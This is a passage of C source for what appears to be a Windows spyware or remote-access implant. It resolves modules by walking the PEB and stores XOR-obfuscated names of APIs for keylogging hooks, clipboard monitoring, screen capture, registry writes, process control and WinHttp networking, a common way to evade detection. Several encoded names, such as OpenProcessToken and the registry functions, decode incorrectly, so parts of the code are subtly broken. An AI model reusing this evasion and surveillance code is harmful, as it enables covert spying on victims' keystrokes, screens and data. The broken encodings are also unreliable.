/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "win32_api.h"

#ifdef _WIN32

#if defined(_MSC_VER)
#include <intrin.h>
#endif
#include <string.h>

c2t_win32_api_t g_c2t_win32 = {0};
static int g_win32_initialized = 0;

void c2t_win32_xor_decode(char *dest, const unsigned char *src, size_t len,
                          unsigned char key) {
  for (size_t i = 0; i < len; ++i) {
    dest[i] = (char)(src[i] ^ key);
  }
  dest[len] = '\0';
}

typedef struct _C2T_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
} C2T_UNICODE_STRING;

typedef struct _C2T_LDR_DATA_TABLE_ENTRY {
  LIST_ENTRY InLoadOrderLinks;
  LIST_ENTRY InMemoryOrderLinks;
  LIST_ENTRY InInitializationOrderLinks;
  PVOID DllBase;
  PVOID EntryPoint;
  ULONG SizeOfImage;
  C2T_UNICODE_STRING FullDllName;
  C2T_UNICODE_STRING BaseDllName;
} C2T_LDR_DATA_TABLE_ENTRY;

typedef struct _C2T_PEB_LDR_DATA {
  ULONG Length;
  BOOLEAN Initialized;
  HANDLE SsHandle;
  LIST_ENTRY InLoadOrderModuleList;
  LIST_ENTRY InMemoryOrderModuleList;
  LIST_ENTRY InInitializationOrderModuleList;
} C2T_PEB_LDR_DATA;

typedef struct _C2T_PEB {
  BOOLEAN InheritedAddressSpace;
  BOOLEAN ReadImageFileExecOptions;
  BOOLEAN BeingDebugged;
  BOOLEAN BitField;
  HANDLE Mutant;
  PVOID ImageBaseAddress;
  C2T_PEB_LDR_DATA *Ldr;
} C2T_PEB;

HMODULE c2t_win32_get_module_peb(const wchar_t *module_name) {
#if defined(_M_ARM64)
  C2T_PEB *peb = (C2T_PEB *)__readx18qword(0x60);
#elif defined(_M_X64) || defined(__x86_64__)
  C2T_PEB *peb = (C2T_PEB *)__readgsqword(0x60);
#elif defined(_M_IX86) || defined(__i386__)
  C2T_PEB *peb = (C2T_PEB *)__readfsdword(0x30);
#else
  C2T_PEB *peb = NULL;
#endif
  if (!peb || !peb->Ldr)
    return NULL;

  PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
  PLIST_ENTRY curr = head->Flink;

  while (curr && curr != head) {
    C2T_LDR_DATA_TABLE_ENTRY *entry =
        CONTAINING_RECORD(curr, C2T_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    if (entry->BaseDllName.Buffer) {
      if (_wcsicmp(entry->BaseDllName.Buffer, module_name) == 0) {
        return (HMODULE)entry->DllBase;
      }
    }
    curr = curr->Flink;
  }
  return NULL;
}



void c2t_win32_api_init(void) {
  if (g_win32_initialized)
    return;

  static const unsigned char enc_user32_dll[] = {47, 41, 63, 40, 105, 104, 116, 62, 54, 54};
  static const unsigned char enc_kernel32_dll[] = {49, 63, 40, 52, 63, 54, 105, 104, 116, 62, 54, 54};
  static const unsigned char enc_advapi32_dll[] = {59, 62, 44, 59, 42, 51, 105, 104, 116, 62, 54, 54};
  static const unsigned char enc_bcrypt_dll[] = {56, 57, 40, 35, 42, 46, 116, 62, 54, 54};
  static const unsigned char enc_shell32_dll[] = {41, 50, 63, 54, 54, 105, 104, 116, 62, 54, 54};

  static const unsigned char enc_winhttp_dll[] = {45, 51, 52, 50, 46, 46, 42, 116, 62, 54, 54};
  static const unsigned char enc_iphlpapi_dll[] = {51, 42, 50, 54, 42, 59, 42, 51, 116, 62, 54, 54};
  static const unsigned char enc_ole32_dll[] = {53, 54, 63, 105, 104, 116, 62, 54, 54};
  static const unsigned char enc_gdiplus_dll[] = {61, 62, 51, 42, 54, 47, 41, 116, 62, 54, 54};

  /* ole32 functions */
  static const unsigned char enc_CreateStreamOnHGlobal[] = {25, 40, 63, 59, 46, 63, 9, 46, 40, 63, 59, 55, 21, 52, 18, 29, 54, 53, 56, 59, 54};
  static const unsigned char enc_GetHGlobalFromStream[] = {29, 63, 46, 18, 29, 54, 53, 56, 59, 54, 30, 40, 53, 55, 9, 46, 40, 63, 59, 55};

  /* gdiplus functions */
  static const unsigned char enc_GdiplusStartup[] = {29, 62, 51, 42, 54, 47, 41, 9, 46, 59, 40, 46, 47, 42};
  static const unsigned char enc_GdiplusShutdown[] = {29, 62, 51, 42, 54, 47, 41, 9, 50, 47, 46, 62, 53, 45, 52};
  static const unsigned char enc_GdipCreateBitmapFromGdiDib[] = {29, 62, 51, 42, 25, 40, 63, 59, 46, 63, 24, 51, 46, 55, 59, 42, 30, 40, 53, 55, 29, 62, 51, 30, 51, 56};
  static const unsigned char enc_GdipSaveImageToStream[] = {29, 62, 51, 42, 9, 59, 44, 63, 19, 55, 59, 61, 63, 14, 53, 9, 46, 40, 63, 59, 55};
  static const unsigned char enc_GdipDisposeImage[] = {29, 62, 51, 42, 30, 51, 41, 42, 53, 41, 63, 19, 55, 59, 61, 63};

  /* user32 functions */
  static const unsigned char enc_GetWindowThreadProcessId[] = {29, 63, 46, 13, 51, 52, 62, 53, 45, 14, 50, 40, 63, 59, 62, 10, 40, 53, 57, 63, 41, 41, 19, 62};
  static const unsigned char enc_OpenClipboard[] = {21, 42, 63, 52, 25, 54, 51, 42, 56, 53, 59, 40, 62};
  static const unsigned char enc_CloseClipboard[] = {25, 54, 53, 41, 63, 25, 54, 51, 42, 56, 53, 59, 40, 62};
  static const unsigned char enc_GetClipboardData[] = {29, 63, 46, 25, 54, 51, 42, 56, 53, 59, 40, 62, 30, 59, 46, 59};
  static const unsigned char enc_IsClipboardFormatAvailable[] = {19, 41, 25, 54, 51, 42, 56, 53, 59, 40, 62, 28, 53, 40, 55, 59, 46, 27, 44, 59, 51, 54, 59, 56, 54, 63};
  static const unsigned char enc_EmptyClipboard[] = {31, 55, 42, 46, 35, 25, 54, 51, 42, 56, 53, 59, 40, 62};
  static const unsigned char enc_SetClipboardData[] = {9, 63, 46, 25, 54, 51, 42, 56, 53, 59, 40, 62, 30, 59, 46, 59};
  static const unsigned char enc_AddClipboardFormatListener[] = {27, 62, 62, 25, 54, 51, 42, 56, 53, 59, 40, 62, 28, 53, 40, 55, 59, 46, 22, 51, 41, 46, 63, 52, 63, 40};
  static const unsigned char enc_RemoveClipboardFormatListener[] = {8, 63, 55, 53, 44, 63, 25, 54, 51, 42, 56, 53, 59, 40, 62, 28, 53, 40, 55, 59, 46, 22, 51, 41, 46, 63, 52, 63, 40};
  static const unsigned char enc_GetForegroundWindow[] = {29, 63, 46, 28, 53, 40, 63, 61, 40, 53, 47, 52, 62, 13, 51, 52, 62, 53, 45};
  static const unsigned char enc_GetWindowTextW[] = {29, 63, 46, 13, 51, 52, 62, 53, 45, 14, 63, 34, 46, 13};
  static const unsigned char enc_CreateWindowExW[] = {25, 40, 63, 59, 46, 63, 13, 51, 52, 62, 53, 45, 31, 34, 13};
  static const unsigned char enc_DestroyWindow[] = {30, 63, 41, 46, 40, 53, 35, 13, 51, 52, 62, 53, 45};
  static const unsigned char enc_RegisterClassW[] = {8, 63, 61, 51, 41, 46, 63, 40, 25, 54, 59, 41, 41, 13};
  static const unsigned char enc_UnregisterClassW[] = {15, 52, 40, 63, 61, 51, 41, 46, 63, 40, 25, 54, 59, 41, 41, 13};
  static const unsigned char enc_DefWindowProcW[] = {30, 63, 60, 13, 51, 52, 62, 53, 45, 10, 40, 53, 57, 13};
  static const unsigned char enc_PeekMessageW[] = {10, 63, 63, 49, 23, 63, 41, 41, 59, 61, 63, 13};
  static const unsigned char enc_TranslateMessage[] = {14, 40, 59, 52, 41, 54, 59, 46, 63, 23, 63, 41, 41, 59, 61, 63};
  static const unsigned char enc_DispatchMessageW[] = {30, 51, 41, 42, 59, 46, 57, 50, 23, 63, 41, 41, 59, 61, 63, 13};
  static const unsigned char enc_ShowWindow[] = {9, 50, 53, 45, 13, 51, 52, 62, 53, 45};
  static const unsigned char enc_SetWindowsHookExW[] = {9, 63, 46, 13, 51, 52, 62, 53, 45, 41, 18, 53, 53, 49, 31, 34, 13};
  static const unsigned char enc_UnhookWindowsHookEx[] = {15, 52, 50, 53, 53, 49, 13, 51, 52, 62, 53, 45, 41, 18, 53, 53, 49, 31, 34};
  static const unsigned char enc_CallNextHookEx[] = {25, 59, 54, 54, 20, 63, 34, 46, 18, 53, 53, 49, 31, 34};
  static const unsigned char enc_VkKeyScanW[] = {12, 49, 17, 63, 35, 9, 57, 59, 52, 13};
  static const unsigned char enc_MapVirtualKeyW[] = {23, 59, 42, 12, 51, 40, 46, 47, 59, 54, 17, 63, 35, 13};
  static const unsigned char enc_SendInput[] = {9, 63, 52, 62, 19, 52, 42, 47, 46};
  static const unsigned char enc_GetMessageW[] = {29, 63, 46, 23, 63, 41, 41, 59, 61, 63, 13};
  static const unsigned char enc_PostThreadMessageW[] = {10, 53, 41, 46, 14, 50, 40, 63, 59, 62, 23, 63, 41, 41, 59, 61, 63, 13};
  static const unsigned char enc_RegisterRawInputDevices[] = {8, 63, 61, 51, 41, 46, 63, 40, 8, 59, 45, 19, 52, 42, 47, 46, 30, 63, 44, 51, 57, 63, 41};
  static const unsigned char enc_GetRawInputData[] = {29, 63, 46, 8, 59, 45, 19, 52, 42, 47, 46, 30, 59, 46, 59};
  static const unsigned char enc_GetAsyncKeyState[] = {29, 63, 46, 27, 41, 35, 52, 57, 17, 63, 35, 9, 46, 59, 46, 63};
  static const unsigned char enc_GetKeyboardLayout[] = {29, 63, 46, 17, 63, 35, 56, 53, 59, 40, 62, 22, 59, 35, 53, 47, 46};
  static const unsigned char enc_GetKeyState[] = {29, 63, 46, 17, 63, 35, 9, 46, 59, 46, 63};
  static const unsigned char enc_ToUnicodeEx[] = {14, 53, 15, 52, 51, 57, 53, 62, 63, 31, 34};
  static const unsigned char enc_RegisterClassExW[] = {8, 63, 61, 51, 41, 46, 63, 40, 25, 54, 59, 41, 41, 31, 34, 13};
  static const unsigned char enc_MsgWaitForMultipleObjects[] = {23, 41, 61, 13, 59, 51, 46, 28, 53, 40, 23, 47, 54, 46, 51, 42, 54, 63, 21, 56, 48, 63, 57, 46, 41};
  static const unsigned char enc_GetDC[] = {0x1D, 0x3F, 0x2E, 0x1E, 0x19};
  static const unsigned char enc_ReleaseDC[] = {0x08, 0x3F, 0x36, 0x3F, 0x3B, 0x29, 0x3F, 0x1E, 0x19};
  static const unsigned char enc_GetSystemMetrics[] = {0x1D, 0x3F, 0x2E, 0x09, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x17, 0x3F, 0x2E, 0x28, 0x33, 0x39, 0x29};
  static const unsigned char enc_EnumDisplayMonitors[] = {0x1F, 0x34, 0x2F, 0x37, 0x1E, 0x33, 0x29, 0x2A, 0x36, 0x3B, 0x23, 0x17, 0x35, 0x34, 0x33, 0x2E, 0x35, 0x28, 0x29};
  static const unsigned char enc_GetMonitorInfoA[] = {0x1D, 0x3F, 0x2E, 0x17, 0x35, 0x34, 0x33, 0x2E, 0x35, 0x28, 0x13, 0x34, 0x3C, 0x35, 0x1B};

  /* gdi32 functions */
  static const unsigned char enc_gdi32_dll[] = {0x3D, 0x3E, 0x33, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36};
  static const unsigned char enc_CreateCompatibleDC[] = {0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x19, 0x35, 0x37, 0x2A, 0x3B, 0x2E, 0x33, 0x38, 0x36, 0x3F, 0x1E, 0x19};
  static const unsigned char enc_CreateCompatibleBitmap[] = {0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x19, 0x35, 0x37, 0x2A, 0x3B, 0x2E, 0x33, 0x38, 0x36, 0x3F, 0x18, 0x33, 0x2E, 0x37, 0x3B, 0x2A};
  static const unsigned char enc_SelectObject[] = {0x09, 0x3F, 0x36, 0x3F, 0x39, 0x2E, 0x15, 0x38, 0x30, 0x3F, 0x39, 0x2E};
  static const unsigned char enc_BitBlt[] = {0x18, 0x33, 0x2E, 0x18, 0x36, 0x2E};
  static const unsigned char enc_GetDIBits[] = {0x1D, 0x3F, 0x2E, 0x1E, 0x13, 0x18, 0x33, 0x2E, 0x29};
  static const unsigned char enc_DeleteObject[] = {0x1E, 0x3F, 0x36, 0x3F, 0x2E, 0x3F, 0x15, 0x38, 0x30, 0x3F, 0x39, 0x2E};
  static const unsigned char enc_DeleteDC[] = {0x1E, 0x3F, 0x36, 0x3F, 0x2E, 0x3F, 0x1E, 0x19};

  /* kernel32 functions */
  static const unsigned char enc_CreateProcessA[] = {25, 40, 63, 59, 46, 63, 10, 40, 53, 57, 63, 41, 41, 27};
  static const unsigned char enc_OpenProcess[] = {21, 42, 63, 52, 10, 40, 53, 57, 63, 41, 41};
  static const unsigned char enc_TerminateProcess[] = {14, 63, 40, 55, 51, 52, 59, 46, 63, 10, 40, 53, 57, 63, 41, 41};
  static const unsigned char enc_GetExitCodeProcess[] = {29, 63, 46, 31, 34, 51, 46, 25, 53, 62, 63, 10, 40, 53, 57, 63, 41, 41};
  static const unsigned char enc_CloseHandle[] = {25, 54, 53, 41, 63, 18, 59, 52, 62, 54, 63};
  static const unsigned char enc_CreateMutexA[] = {25, 40, 63, 59, 46, 63, 23, 47, 46, 63, 34, 27};
  static const unsigned char enc_ReleaseMutex[] = {8, 63, 54, 63, 59, 41, 63, 23, 47, 46, 63, 34};
  static const unsigned char enc_OpenMutexA[] = {21, 42, 63, 52, 23, 47, 46, 63, 34, 27};
  static const unsigned char enc_CreateEventA[] = {25, 40, 63, 59, 46, 63, 31, 44, 63, 52, 46, 27};
  static const unsigned char enc_SetEvent[] = {9, 63, 46, 31, 44, 63, 52, 46};
  static const unsigned char enc_ResetEvent[] = {8, 63, 41, 63, 46, 31, 44, 63, 52, 46};
  static const unsigned char enc_OpenEventA[] = {21, 42, 63, 52, 31, 44, 63, 52, 46, 27};
  static const unsigned char enc_WaitForSingleObject[] = {13, 59, 51, 46, 28, 53, 40, 9, 51, 52, 61, 54, 63, 21, 56, 48, 63, 57, 46};
  static const unsigned char enc_Sleep[] = {9, 54, 63, 63, 42};
  static const unsigned char enc_GetTickCount64[] = {29, 63, 46, 14, 51, 57, 49, 25, 53, 47, 52, 46, 108, 110};
  static const unsigned char enc_QueryPerformanceFrequency[] = {11, 47, 63, 40, 35, 10, 63, 40, 60, 53, 40, 55, 59, 52, 57, 63, 28, 40, 63, 43, 47, 63, 52, 57, 35};
  static const unsigned char enc_QueryPerformanceCounter[] = {11, 47, 63, 40, 35, 10, 63, 40, 60, 53, 40, 55, 59, 52, 57, 63, 25, 53, 47, 52, 46, 63, 40};
  static const unsigned char enc_GetCurrentProcessId[] = {29, 63, 46, 25, 47, 40, 40, 63, 52, 46, 10, 40, 53, 57, 63, 41, 41, 19, 62};
  static const unsigned char enc_GetStdHandle[] = {29, 63, 46, 9, 46, 62, 18, 59, 52, 62, 54, 63};
  static const unsigned char enc_ProcessIdToSessionId[] = {10, 40, 53, 57, 63, 41, 41, 19, 62, 14, 53, 9, 63, 41, 41, 51, 53, 52, 19, 62};
  static const unsigned char enc_CreateDirectoryA[] = {25, 40, 63, 59, 46, 63, 30, 51, 40, 63, 57, 46, 53, 40, 35, 27};
  static const unsigned char enc_CreateFileA[] = {25, 40, 63, 59, 46, 63, 28, 51, 54, 63, 27};
  static const unsigned char enc_CreateFileW[] = {25, 40, 63, 59, 46, 63, 28, 51, 54, 63, 13};
  static const unsigned char enc_GetCurrentDirectoryA[] = {29, 63, 46, 25, 47, 40, 40, 63, 52, 46, 30, 51, 40, 63, 57, 46, 53, 40, 35, 27};
  static const unsigned char enc_GetFullPathNameA[] = {29, 63, 46, 28, 47, 54, 54, 10, 59, 46, 50, 20, 59, 55, 63, 27};
  static const unsigned char enc_GetFileAttributesA[] = {29, 63, 46, 28, 51, 54, 63, 27, 46, 46, 40, 51, 56, 47, 46, 63, 41, 27};
  static const unsigned char enc_GetFileAttributesW[] = {29, 63, 46, 28, 51, 54, 63, 27, 46, 46, 40, 51, 56, 47, 46, 63, 41, 13};
  static const unsigned char enc_ReadFile[] = {8, 63, 59, 62, 28, 51, 54, 63};
  static const unsigned char enc_WriteFile[] = {13, 40, 51, 46, 63, 28, 51, 54, 63};
  static const unsigned char enc_GetFileSizeEx[] = {29, 63, 46, 28, 51, 54, 63, 9, 51, 32, 63, 31, 34};
  static const unsigned char enc_DeleteFileA[] = {30, 63, 54, 63, 46, 63, 28, 51, 54, 63, 27};
  static const unsigned char enc_MoveFileExA[] = {23, 53, 44, 63, 28, 51, 54, 63, 31, 34, 27};
  static const unsigned char enc_GetConsoleWindow[] = {29, 63, 46, 25, 53, 52, 41, 53, 54, 63, 13, 51, 52, 62, 53, 45};
  static const unsigned char enc_FreeConsole[] = {28, 40, 63, 63, 25, 53, 52, 41, 53, 54, 63};
  static const unsigned char enc_SetConsoleCtrlHandler[] = {9, 63, 46, 25, 53, 52, 41, 53, 54, 63, 25, 46, 40, 54, 18, 59, 52, 62, 54, 63, 40};
  static const unsigned char enc_SetConsoleTitleA[] = {9, 63, 46, 25, 53, 52, 41, 53, 54, 63, 14, 51, 46, 54, 63, 27};
  static const unsigned char enc_WideCharToMultiByte[] = {13, 51, 62, 63, 25, 50, 59, 40, 14, 53, 23, 47, 54, 46, 51, 24, 35, 46, 63};
  static const unsigned char enc_MultiByteToWideChar[] = {23, 47, 54, 46, 51, 24, 35, 46, 63, 14, 53, 13, 51, 62, 63, 25, 50, 59, 40};
  static const unsigned char enc_QueryFullProcessImageNameA[] = {11, 47, 63, 40, 35, 28, 47, 54, 54, 10, 40, 53, 57, 63, 41, 41, 19, 55, 59, 61, 63, 20, 59, 55, 63, 27};
  static const unsigned char enc_QueryFullProcessImageNameW[] = {11, 47, 63, 40, 35, 28, 47, 54, 54, 10, 40, 53, 57, 63, 41, 41, 19, 55, 59, 61, 63, 20, 59, 55, 63, 13};
  static const unsigned char enc_GlobalLock[] = {29, 54, 53, 56, 59, 54, 22, 53, 57, 49};
  static const unsigned char enc_GlobalUnlock[] = {29, 54, 53, 56, 59, 54, 15, 52, 54, 53, 57, 49};
  static const unsigned char enc_GlobalSize[] = {29, 54, 53, 56, 59, 54, 9, 51, 32, 63};
  static const unsigned char enc_GlobalAlloc[] = {29, 54, 53, 56, 59, 54, 27, 54, 54, 53, 57};
  static const unsigned char enc_GlobalFree[] = {29, 54, 53, 56, 59, 54, 28, 40, 63, 63};
  static const unsigned char enc_GetModuleFileNameA[] = {29, 63, 46, 23, 53, 62, 47, 54, 63, 28, 51, 54, 63, 20, 59, 55, 63, 27};
  static const unsigned char enc_GetModuleFileNameW[] = {29, 63, 46, 23, 53, 62, 47, 54, 63, 28, 51, 54, 63, 20, 59, 55, 63, 13};
  static const unsigned char enc_GetModuleHandleA[] = {29, 63, 46, 23, 53, 62, 47, 54, 63, 18, 59, 52, 62, 54, 63, 27};
  static const unsigned char enc_GetModuleHandleW[] = {29, 63, 46, 23, 53, 62, 47, 54, 63, 18, 59, 52, 62, 54, 63, 13};
  static const unsigned char enc_LoadLibraryA[] = {22, 53, 59, 62, 22, 51, 56, 40, 59, 40, 35, 27};
  static const unsigned char enc_LoadLibraryW[] = {22, 53, 59, 62, 22, 51, 56, 40, 59, 40, 35, 13};
  static const unsigned char enc_GetProcAddress[] = {29, 63, 46, 10, 40, 53, 57, 27, 62, 62, 40, 63, 41, 41};
  static const unsigned char enc_GetSystemTime[] = {29, 63, 46, 9, 35, 41, 46, 63, 55, 14, 51, 55, 63};
  static const unsigned char enc_GetCurrentProcess[] = {29, 63, 46, 25, 47, 40, 40, 63, 52, 46, 10, 40, 53, 57, 63, 41, 41};
  static const unsigned char enc_SetProcessWorkingSetSize[] = {9, 63, 46, 10, 40, 53, 57, 63, 41, 41, 13, 53, 40, 49, 51, 52, 61, 9, 63, 46, 9, 51, 32, 63};
  static const unsigned char enc_GetProcessWorkingSetSize[] = {29, 63, 46, 10, 40, 53, 57, 63, 41, 41, 13, 53, 40, 49, 51, 52, 61, 9, 63, 46, 9, 51, 32, 63};
  static const unsigned char enc_K32GetProcessMemoryInfo[] = {17, 105, 104, 29, 63, 46, 10, 40, 53, 57, 63, 41, 41, 23, 63, 55, 53, 40, 35, 19, 52, 60, 53};
  static const unsigned char enc_VirtualLock[] = {12, 51, 40, 46, 47, 59, 54, 22, 53, 57, 49};
  static const unsigned char enc_VirtualUnlock[] = {12, 51, 40, 46, 47, 59, 54, 15, 52, 54, 53, 57, 49};
  static const unsigned char enc_InitializeCriticalSection[] = {19, 52, 51, 46, 51, 59, 54, 51, 32, 63, 25, 40, 51, 46, 51, 57, 59, 54, 9, 63, 57, 46, 51, 53, 52};
  static const unsigned char enc_EnterCriticalSection[] = {31, 52, 46, 63, 40, 25, 40, 51, 46, 51, 57, 59, 54, 9, 63, 57, 46, 51, 53, 52};
  static const unsigned char enc_LeaveCriticalSection[] = {22, 63, 59, 44, 63, 25, 40, 51, 46, 51, 57, 59, 54, 9, 63, 57, 46, 51, 53, 52};
  static const unsigned char enc_DeleteCriticalSection[] = {30, 63, 54, 63, 46, 63, 25, 40, 51, 46, 51, 57, 59, 54, 9, 63, 57, 46, 51, 53, 52};
  static const unsigned char enc_InitOnceExecuteOnce[] = {19, 52, 51, 46, 21, 52, 57, 63, 31, 34, 63, 57, 47, 46, 63, 21, 52, 57, 63};
  static const unsigned char enc_CreateThread[] = {25, 40, 63, 59, 46, 63, 14, 50, 40, 63, 59, 62};
  static const unsigned char enc_GetCurrentThreadId[] = {29, 63, 46, 25, 47, 40, 40, 63, 52, 46, 14, 50, 40, 63, 59, 62, 19, 62};
  static const unsigned char enc_GetLocaleInfoA[] = {29, 63, 46, 22, 53, 57, 59, 54, 63, 19, 52, 60, 53, 27};
  static const unsigned char enc_GetLastError[] = {29, 63, 46, 22, 59, 41, 46, 31, 40, 40, 53, 40};
  static const unsigned char enc_SetLastError[] = {9, 63, 46, 22, 59, 41, 46, 31, 40, 40, 53, 40};
  static const unsigned char enc_CreateDirectoryW[] = {25, 40, 63, 59, 46, 63, 30, 51, 40, 63, 57, 46, 53, 40, 35, 13};
  static const unsigned char enc_FindFirstFileW[] = {28, 51, 52, 62, 28, 51, 40, 41, 46, 28, 51, 54, 63, 13};
  static const unsigned char enc_FindNextFileW[] = {28, 51, 52, 62, 20, 63, 34, 46, 28, 51, 54, 63, 13};
  static const unsigned char enc_FindClose[] = {28, 51, 52, 62, 25, 54, 53, 41, 63};
  static const unsigned char enc_FreeLibrary[] = {28, 40, 63, 63, 22, 51, 56, 40, 59, 40, 35};
  static const unsigned char enc_HeapSetInformation[] = {18, 63, 59, 42, 9, 63, 46, 19, 52, 60, 53, 40, 55, 59, 46, 51, 53, 52};
  static const unsigned char enc_InitializeConditionVariable[] = {19, 52, 51, 46, 51, 59, 54, 51, 32, 63, 25, 53, 52, 62, 51, 46, 51, 53, 52, 12, 59, 40, 51, 59, 56, 54, 63};
  static const unsigned char enc_SleepConditionVariableCS[] = {9, 54, 63, 63, 42, 25, 53, 52, 62, 51, 46, 51, 53, 52, 12, 59, 40, 51, 59, 56, 54, 63, 25, 9};
  static const unsigned char enc_WakeConditionVariable[] = {13, 59, 49, 63, 25, 53, 52, 62, 51, 46, 51, 53, 52, 12, 59, 40, 51, 59, 56, 54, 63};
  static const unsigned char enc_GetComputerNameA[] = {29, 63, 46, 25, 53, 55, 42, 47, 46, 63, 40, 20, 59, 55, 63, 27};
  static const unsigned char enc_GetNativeSystemInfo[] = {29, 63, 46, 20, 59, 46, 51, 44, 63, 9, 35, 41, 46, 63, 55, 19, 52, 60, 53};
  static const unsigned char enc_CreatePipe[] = {25, 40, 63, 59, 46, 63, 10, 51, 42, 63};
  static const unsigned char enc_PeekNamedPipe[] = {10, 63, 63, 49, 4, 59, 55, 63, 62, 10, 51, 42, 63};
  static const unsigned char enc_SetHandleInformation[] = {9, 63, 46, 18, 59, 52, 62, 54, 63, 19, 52, 60, 53, 40, 55, 59, 46, 51, 53, 52};
  static const unsigned char enc_GetEnvironmentVariableA[] = {29, 63, 46, 31, 52, 44, 51, 40, 53, 52, 55, 63, 52, 46, 12, 59, 40, 51, 59, 56, 54, 63, 27};
  static const unsigned char enc_GetSystemDirectoryA[] = {29, 63, 46, 9, 35, 41, 46, 63, 55, 30, 51, 40, 63, 57, 46, 53, 40, 35, 27};
  static const unsigned char enc_CreateJobObjectA[] = {25, 40, 63, 59, 46, 63, 16, 53, 56, 21, 56, 48, 63, 57, 46, 27};
  static const unsigned char enc_SetInformationJobObject[] = {9, 63, 46, 19, 52, 60, 53, 40, 55, 59, 46, 51, 53, 52, 16, 53, 56, 21, 56, 48, 63, 57, 46};
  static const unsigned char enc_AssignProcessToJobObject[] = {27, 41, 41, 51, 61, 52, 10, 40, 53, 57, 63, 41, 41, 14, 53, 16, 53, 56, 21, 56, 48, 63, 57, 46};
  static const unsigned char enc_TerminateJobObject[] = {14, 63, 40, 55, 51, 52, 59, 46, 63, 16, 53, 56, 21, 56, 48, 63, 57, 46};
  static const unsigned char enc_ResumeThread[] = {8, 63, 41, 47, 55, 63, 14, 50, 40, 63, 59, 62};
  static const unsigned char enc_DuplicateHandle[] = {30, 47, 42, 54, 51, 57, 59, 46, 63, 18, 59, 52, 62, 54, 63};

  /* ntdll functions */
  static const unsigned char enc_ntdll_dll[] = {52, 46, 62, 54, 54, 116, 62, 54, 54};
  static const unsigned char enc_RtlGetVersion[] = {8, 46, 54, 29, 63, 46, 12, 63, 40, 41, 51, 53, 52};

  /* advapi32 functions */
  static const unsigned char enc_OpenProcessToken[] = {21, 58, 63, 52, 26, 40, 53, 57, 63, 41, 41, 30, 53, 49, 63, 52};
  static const unsigned char enc_GetTokenInformation[] = {29, 63, 46, 30, 53, 49, 63, 52, 19, 52, 60, 53, 40, 55, 59, 46, 51, 53, 52};
  static const unsigned char enc_GetUserNameA[] = {29, 63, 46, 15, 41, 63, 40, 20, 59, 55, 63, 27};
  static const unsigned char enc_SystemFunction036[] = {9, 35, 41, 46, 63, 55, 28, 47, 52, 57, 46, 51, 53, 52, 106, 105, 108};

  /* bcrypt functions */
  static const unsigned char enc_BCryptOpenAlgorithmProvider[] = {24, 25, 40, 35, 42, 46, 21, 42, 63, 52, 27, 54, 61, 53, 40, 51, 46, 50, 55, 10, 40, 53, 44, 51, 62, 63, 40};
  static const unsigned char enc_BCryptGenRandom[] = {24, 25, 40, 35, 42, 46, 29, 63, 52, 8, 59, 52, 62, 53, 55};
  static const unsigned char enc_BCryptCloseAlgorithmProvider[] = {24, 25, 40, 35, 42, 46, 25, 54, 53, 41, 63, 27, 54, 61, 53, 40, 51, 46, 50, 55, 10, 40, 53, 44, 51, 62, 63, 40};

  /* advapi32 functions */
  static const unsigned char enc_RegOpenKeyExA[] = {24, 63, 61, 21, 42, 63, 52, 1, 63, 51, 31, 34, 27};
  static const unsigned char enc_RegSetValueExA[] = {24, 63, 61, 25, 63, 54, 20, 59, 54, 47, 63, 31, 34, 27};
  static const unsigned char enc_RegDeleteValueA[] = {24, 63, 61, 30, 63, 54, 63, 54, 63, 20, 59, 54, 47, 63, 27};
  static const unsigned char enc_RegQueryValueExA[] = {24, 63, 61, 27, 47, 63, 40, 51, 20, 59, 54, 47, 63, 31, 34, 27};
  static const unsigned char enc_RegCloseKey[] = {24, 63, 61, 25, 54, 53, 41, 63, 1, 63, 51};

  /* shell32 functions */
  static const unsigned char enc_SHGetFolderPathW[] = {9, 18, 29, 63, 46, 28, 53, 54, 62, 63, 40, 10, 59, 46, 50, 13};
  static const unsigned char enc_DragQueryFileW[] = {30, 40, 59, 61, 11, 47, 63, 40, 35, 28, 51, 54, 63, 13};
  static const unsigned char enc_ShellExecuteExA[] = {9, 50, 63, 54, 54, 31, 42, 63, 57, 47, 46, 63, 31, 34, 27};
  static const unsigned char enc_IsUserAnAdmin[] = {19, 41, 15, 41, 63, 40, 27, 52, 27, 62, 55, 51, 52};

  /* winhttp functions */
  static const unsigned char enc_WinHttpOpen[] = {13, 51, 52, 18, 46, 46, 42, 21, 42, 63, 52};
  static const unsigned char enc_WinHttpConnect[] = {13, 51, 52, 18, 46, 46, 42, 25, 53, 52, 52, 63, 57, 46};
  static const unsigned char enc_WinHttpOpenRequest[] = {13, 51, 52, 18, 46, 46, 42, 21, 42, 63, 52, 8, 63, 43, 47, 63, 41, 46};
  static const unsigned char enc_WinHttpSendRequest[] = {13, 51, 52, 18, 46, 46, 42, 9, 63, 52, 62, 8, 63, 43, 47, 63, 41, 46};
  static const unsigned char enc_WinHttpReceiveResponse[] = {13, 51, 52, 18, 46, 46, 42, 8, 63, 57, 63, 51, 44, 63, 8, 63, 41, 42, 53, 52, 41, 63};
  static const unsigned char enc_WinHttpQueryDataAvailable[] = {13, 51, 52, 18, 46, 46, 42, 11, 47, 63, 40, 35, 30, 59, 46, 59, 27, 44, 59, 51, 54, 59, 56, 54, 63};
  static const unsigned char enc_WinHttpReadData[] = {13, 51, 52, 18, 46, 46, 42, 8, 63, 59, 62, 30, 59, 46, 59};
  static const unsigned char enc_WinHttpWriteData[] = {13, 51, 52, 18, 46, 46, 42, 13, 40, 51, 46, 63, 30, 59, 46, 59};
  static const unsigned char enc_WinHttpQueryHeaders[] = {13, 51, 52, 18, 46, 46, 42, 11, 47, 63, 40, 35, 18, 63, 59, 62, 63, 40, 41};
